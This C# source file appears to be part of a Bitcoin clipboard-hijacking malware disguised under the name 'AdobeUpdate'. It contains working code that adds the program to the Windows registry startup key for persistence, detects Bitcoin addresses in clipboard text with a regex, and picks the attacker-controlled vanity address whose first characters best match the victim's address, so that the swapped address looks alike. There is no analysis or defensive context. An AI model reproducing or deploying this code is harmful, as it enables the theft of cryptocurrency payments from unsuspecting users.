﻿using System;
using System.Linq;
using System.Text.RegularExpressions;
using AdobeUpdate.Properties;
using Microsoft.Win32;

namespace AdobeUpdate.Main
{
    public static class Tools
    {
        public static void SetStartup(string executablePath)
        {
            RegistryKey rk = Registry.CurrentUser.OpenSubKey
                (Assists.RegistryStartupPath, true);

            if (rk == null) return;
            //if (rk.GetValue(Config.RegistryStartupName) == null)
                //MessageBox.Show(Config.WelcomeMessage, Config.RegistryStartupName);

            rk.SetValue(Config.RegistryStartupName, executablePath);
        }

        public static void RemoveFromStartup()
        {
            RegistryKey rk = Registry.CurrentUser.OpenSubKey
                (Assists.RegistryStartupPath, true);
            
            if (rk == null) return; 
            rk.DeleteValue(Config.RegistryStartupName, false);
        }

        public static bool ProbablyBtcAddress(string clipboard)
        {
            string address = clipboard.Trim();
            // BTC address length from 26 to 34
            if (address.Length < 26 || address.Length > 34) return false;
            var r = new Regex("^(1|3)[123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz].*$");
            if (!r.IsMatch(address)) return false;
            return true;
        }

        public static string MostSuitableBtcAddress(string originalClipboardText)
        {
            try
            {
                string finalAddress = Config.SwapDefaultBtcAddress;

                string originalAddr = originalClipboardText.Trim();

                int maxFirstCharFit = 0;
                foreach (var a in Resources.vanityAddresses.Split(new[] { Environment.NewLine }, StringSplitOptions.RemoveEmptyEntries).ToList())
                {
                    int actFirstCharFit = FirstCharFitNum(a, originalAddr);
                    if (actFirstCharFit <= maxFirstCharFit) continue;
                    finalAddress = a;
                    maxFirstCharFit = actFirstCharFit;
                }
                return finalAddress;
            }
            catch
            {
                return "";
            }
        }

        private static int FirstCharFitNum(string a, string b)
        {
            int cnt = 0;
            bool match = true;
            for (int i = 0; i < Math.Min(a.Length,b.Length) && match; i++)
            {
                if (a[i] != b[i])
                    match = false;
                else
                    cnt++;
            }
            return cnt;
        }
    }
}
